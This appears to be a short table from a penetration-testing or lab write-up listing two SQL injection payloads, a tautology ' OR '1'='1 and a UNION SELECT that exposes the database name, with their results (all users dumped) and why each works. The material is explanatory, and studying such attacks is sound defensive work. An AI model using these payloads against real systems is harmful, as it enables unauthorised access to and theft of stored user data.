| Payload | Result | Why it works |
| :--- | :--- | :--- |
| ' OR '1'='1 | Dumped all users | Injects a tautology that forces the WHERE clause to be true for every row. |
| ' UNION SELECT null, database() # | Revealed database name | Uses UNION to append the results of a second query to the first. |
